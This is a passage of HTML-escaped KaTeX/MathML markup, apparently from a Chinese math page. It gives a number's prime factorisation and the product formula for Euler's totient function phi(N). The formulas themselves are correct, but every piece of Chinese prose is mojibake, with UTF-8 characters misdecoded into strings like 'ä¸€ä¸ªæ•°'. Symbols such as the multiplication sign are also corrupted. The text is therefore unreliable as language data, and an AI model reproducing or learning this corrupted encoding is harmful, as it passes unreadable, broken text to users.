&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ä¸€&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ä¸ª&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ•°&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;çš„&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;è´¨&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;å› &lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ•°&lt;/mi&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;ä¸€ä¸ªæ•°çš„è´¨å› æ•°N = p^{a_{1}}_{1}p^{a_{2}}_{2}...p^{a_{m}}_{m}
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ä¸€&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ä¸ª&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ•°&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;çš„&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;è´¨&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;å› &lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ•°&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0126em;vertical-align:-0.26630799999999993em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.746292em;&#34;&gt;&lt;span style=&#34;top:-2.433692em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1449em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.26630799999999993em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.746292em;&#34;&gt;&lt;span style=&#34;top:-2.433692em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1449em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.26630799999999993em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7143919999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;m&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.16454285714285719em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;m&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.247em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;åˆ™ä¸€ä¸ªæ•°çš„æ¬§æ‹‰å‡½æ•°çš„å®šä¹‰ï¼š&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;Ï•&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;/mfrac&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;/mfrac&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;/msub&gt;&lt;/mfrac&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\phi(N) = N * \frac{p_{1}-1}{p_{1}} * \frac{p_{2}-1}{p_{2}} * ... * \frac{p_{m}-1}{p_{m}}
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;Ï•&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.20188em;vertical-align:-0.8804400000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.32144em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8804400000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.20188em;vertical-align:-0.8804400000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.32144em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8804400000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.46528em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.20188em;vertical-align:-0.8804400000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.32144em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;m&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;m&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span 